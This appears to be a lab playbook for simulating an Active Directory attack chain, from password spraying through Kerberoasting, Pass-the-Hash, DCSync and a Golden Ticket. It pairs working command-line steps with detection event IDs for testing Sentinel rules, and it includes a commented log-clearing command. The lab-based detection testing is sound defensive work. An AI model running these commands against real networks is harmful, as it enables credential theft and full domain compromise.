# Active Directory Attack Playbook

This document contains step-by-step attack simulations for the AD Security Lab.

## Table of Contents
1. [Network Reconnaissance](#1-network-reconnaissance)
2. [Password Spraying](#2-password-spraying)
3. [AS-REP Roasting](#3-as-rep-roasting)
4. [Kerberoasting](#4-kerberoasting)
5. [Pass-the-Hash](#5-pass-the-hash)
6. [DCSync Attack](#6-dcsync-attack)
7. [Golden Ticket](#7-golden-ticket)

---

## Prerequisites

Before starting attacks, ensure:
- Kali Linux is configured with IP 192.168.1.10
- All Windows machines are running and domain-joined
- Sysmon is installed on all Windows machines
- You have prepared attack tools

### Tool Setup on Kali
```bash
# Update and install tools
sudo apt update
sudo apt install -y bloodhound neo4j crackmapexec evil-winrm impacket-scripts responder nmap

# Create working directory
mkdir -p ~/ad-lab-attacks
cd ~/ad-lab-attacks

# Create user list
cat > users.txt << 'EOF'
jsmith
jdoe
bwilson
admin.user
svc_sql
EOF

# Create password list
cat > passwords.txt << 'EOF'
Password123!
Summer2024!
Welcome1!
Company2024!
AdminP@ss1!
SQLService123!
EOF
```

---

## 1. Network Reconnaissance

### 1.1 Host Discovery
```bash
# Discover live hosts
nmap -sn 192.168.1.0/24

# Expected output:
# 192.168.1.1 - Gateway
# 192.168.1.10 - Kali (self)
# 192.168.1.100 - DC01
# 192.168.1.101 - WS01
# 192.168.1.102 - WS02
```

### 1.2 Port Scanning
```bash
# Full port scan of DC
nmap -sV -sC -p- 192.168.1.100 -oN dc01_scan.txt

# Quick scan of all targets
nmap -sV -sC -p 22,53,88,135,139,389,445,636,3268,3389,5985 192.168.1.100-102
```

### 1.3 SMB Enumeration
```bash
# Enumerate SMB shares
crackmapexec smb 192.168.1.100 --shares

# Enumerate users (null session)
crackmapexec smb 192.168.1.100 --users

# Using enum4linux
enum4linux -a 192.168.1.100
```

### 1.4 LDAP Enumeration
```bash
# Anonymous LDAP query
ldapsearch -x -H ldap://192.168.1.100 -b "DC=yourcompany,DC=local"

# Get domain info
crackmapexec ldap 192.168.1.100 -u '' -p '' --kdcHost 192.168.1.100
```

### 1.5 BloodHound Collection
```bash
# Start neo4j
sudo neo4j console &

# Collect AD data with valid credentials (after obtaining)
bloodhound-python -u jsmith -p 'Password123!' -d yourcompany.local -ns 192.168.1.100 -c All

# Import JSON files into BloodHound GUI
```

### Detection Points
- **Event ID 4625**: Multiple failed logons (port scanning)
- **Event ID 4624**: Anonymous logon attempts
- **Sysmon Event 3**: Network connections to DC ports

---

## 2. Password Spraying

### 2.1 SMB Password Spray
```bash
# Spray passwords against users
crackmapexec smb 192.168.1.100 -u users.txt -p passwords.txt --continue-on-success

# Output will show successful credentials:
# SMB  192.168.1.100  445  DC01  [+] yourcompany.local\jsmith:Password123!
```

### 2.2 Kerberos Password Spray (Stealthier)
```bash
# Using kerbrute
kerbrute passwordspray -d yourcompany.local --dc 192.168.1.100 users.txt 'Password123!'
```

### 2.3 LDAP Password Spray
```bash
crackmapexec ldap 192.168.1.100 -u users.txt -p passwords.txt --continue-on-success
```

### Detection Points
- **Event ID 4625**: Multiple failed logons from same IP
- **Event ID 4771**: Kerberos pre-authentication failed
- **Pattern**: Many users, few passwords, short timeframe

---

## 3. AS-REP Roasting

### 3.1 Find Vulnerable Users
```bash
# Find users with "Do not require Kerberos preauthentication"
impacket-GetNPUsers yourcompany.local/ -usersfile users.txt -dc-ip 192.168.1.100 -format hashcat -outputfile asrep_hashes.txt

# Or with valid credentials for more complete enumeration
impacket-GetNPUsers yourcompany.local/jsmith:Password123! -dc-ip 192.168.1.100 -request
```

### 3.2 Crack AS-REP Hashes
```bash
# Using hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Using john
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

### Expected Result
```
$krb5asrep$23$bwilson@YOURCOMPANY.LOCAL:...:Welcome1!
```

### Detection Points
- **Event ID 4768**: TGT request with RC4 encryption (0x17)
- **Pattern**: AS-REQ for user without pre-auth

---

## 4. Kerberoasting

### 4.1 Find Service Accounts with SPNs
```bash
# Request TGS for all SPNs
impacket-GetUserSPNs yourcompany.local/jsmith:Password123! -dc-ip 192.168.1.100 -outputfile kerberoast_hashes.txt

# List SPNs only
impacket-GetUserSPNs yourcompany.local/jsmith:Password123! -dc-ip 192.168.1.100
```

### 4.2 Crack Service Tickets
```bash
# Using hashcat
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Using john
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
```

### Expected Result
```
$krb5tgs$23$*svc_sql$YOURCOMPANY.LOCAL$...:SQLService123!
```

### Detection Points
- **Event ID 4769**: Service ticket request with RC4 encryption (0x17)
- **Pattern**: Multiple TGS requests from single user

---

## 5. Pass-the-Hash

### 5.1 Obtain NTLM Hash
First, you need to obtain a hash (via Mimikatz, SAM dump, etc.):
```powershell
# On compromised Windows machine with Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

### 5.2 Use Hash for Authentication
```bash
# With impacket-psexec
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 administrator@192.168.1.101

# With crackmapexec
crackmapexec smb 192.168.1.101 -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4

# With evil-winrm
evil-winrm -i 192.168.1.101 -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4
```

### 5.3 Spray Hash Across Network
```bash
# Check where hash works
crackmapexec smb 192.168.1.100-102 -u administrator -H <hash>
```

### Detection Points
- **Event ID 4624**: NTLM logon from unusual source
- **Event ID 4648**: Explicit credential logon
- **Event ID 4776**: NTLM credential validation

---

## 6. DCSync Attack

### 6.1 Prerequisites
- Requires Domain Admin or specific replication rights
- Can be performed with compromised admin.user credentials

### 6.2 Execute DCSync
```bash
# Dump all hashes from DC
impacket-secretsdump yourcompany.local/admin.user:AdminP@ss1!@192.168.1.100

# Dump specific user
impacket-secretsdump yourcompany.local/admin.user:AdminP@ss1!@192.168.1.100 -just-dc-user krbtgt

# Dump NTDS.dit via hash
impacket-secretsdump -hashes <NTLM_HASH> yourcompany.local/admin.user@192.168.1.100
```

### 6.3 Expected Output
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8c37c6e5e5e5f5e5e5e5e5e5e5e5e5e5:::
...
```

### Detection Points
- **Event ID 4662**: Directory service access
- **Event ID 4624**: Logon with replication privileges
- **Pattern**: Replicating Directory Changes requests

---

## 7. Golden Ticket

### 7.1 Prerequisites
- Need krbtgt NTLM hash (from DCSync)
- Need Domain SID

### 7.2 Get Domain SID
```bash
# Using impacket
impacket-lookupsid yourcompany.local/jsmith:Password123!@192.168.1.100

# Output: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
```

### 7.3 Create Golden Ticket
```bash
# Using impacket-ticketer
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain yourcompany.local administrator

# This creates: administrator.ccache
```

### 7.4 Use Golden Ticket
```bash
# Set Kerberos credential cache
export KRB5CCNAME=administrator.ccache

# Access DC with ticket
impacket-psexec yourcompany.local/administrator@dc01.yourcompany.local -k -no-pass

# Access any resource
impacket-smbexec yourcompany.local/administrator@192.168.1.100 -k -no-pass
```

### Detection Points
- **Event ID 4768**: TGT with unusual lifetime
- **Event ID 4769**: Service ticket for fake user
- **Pattern**: TGT lifetime > 10 hours

---

## Attack Chain Summary

```
1. Reconnaissance
   └── nmap, crackmapexec, bloodhound
        ↓
2. Initial Access
   └── Password Spraying → jsmith:Password123!
        ↓
3. Credential Harvesting
   ├── AS-REP Roasting → bwilson:Welcome1!
   └── Kerberoasting → svc_sql:SQLService123!
        ↓
4. Lateral Movement
   └── jsmith → WS01 (local admin access)
        ↓
5. Privilege Escalation
   └── Mimikatz → admin.user hash
        ↓
6. Domain Compromise
   └── DCSync → All password hashes
        ↓
7. Persistence
   └── Golden Ticket → Permanent access
```

---

## Cleanup After Testing

```bash
# Remove created files
rm -rf ~/ad-lab-attacks/*.txt
rm -rf ~/ad-lab-attacks/*.ccache

# On Windows, clear security logs (requires admin)
# wevtutil cl Security
# Note: This will trigger Event ID 1102 (Log Cleared)
```

---

## Important Notes

⚠️ **Legal Disclaimer**: Only use these techniques in authorized lab environments. Unauthorized access to computer systems is illegal.

⚠️ **Detection Testing**: After each attack, verify that your detection rules in Azure Sentinel are triggering correctly.

⚠️ **Rotate Credentials**: After testing, change all passwords used in the lab to prevent accidental exposure.

---

*For detection rules, see [Detection Rules](../detections/kql-queries/)*
